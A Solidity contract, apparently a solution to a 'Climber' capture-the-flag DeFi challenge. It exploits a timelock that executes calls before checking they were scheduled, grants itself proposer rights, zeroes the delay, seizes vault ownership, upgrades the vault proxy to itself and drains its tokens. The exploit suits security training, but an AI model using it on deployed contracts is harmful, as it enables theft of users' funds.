// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "../../src/climber/ClimberConstants.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {IERC1822Proxiable} from "@openzeppelin/contracts/interfaces/draft-IERC1822.sol";
import {ERC1967Utils} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

contract ClimberAttacker is IERC1822Proxiable{
    address private immutable timelock;
    address private immutable vault;
    address private immutable token;
    address private immutable recovery;
    constructor(address timelock_, address vault_, address token_, address recovery_){
        timelock = timelock_;
        vault = vault_;
        token = token_;
        recovery = recovery_;

    }
    function schedule() public {
        uint256 transactionCount = 4;
        address[] memory targets = new address[](transactionCount);
        uint256[] memory values = new uint256[](transactionCount);
        bytes[] memory dataElements = new bytes[](transactionCount);
        bytes32 salt = bytes32(0);


        targets[0] = address (timelock);
        dataElements[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));

        targets[1] = address (timelock);
        dataElements[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        targets[2] = address (vault);
        dataElements[2] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, address(this));

        targets[3] = address (this);
        dataElements[3] = abi.encodePacked(this.schedule.selector);

        ClimberTimelock(payable(timelock)).schedule(targets, values, dataElements, salt);
        this.attack();
    }

    function attack() external {
        ClimberVault(vault).upgradeToAndCall(address(this), abi.encodePacked(this.sweepFunds.selector));
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds() external  {
        SafeTransferLib.safeTransfer(token, recovery, IERC20(token).balanceOf(address(this)));
    }
    function proxiableUUID() external view virtual returns (bytes32) {
        return ERC1967Utils.IMPLEMENTATION_SLOT;
    }

}
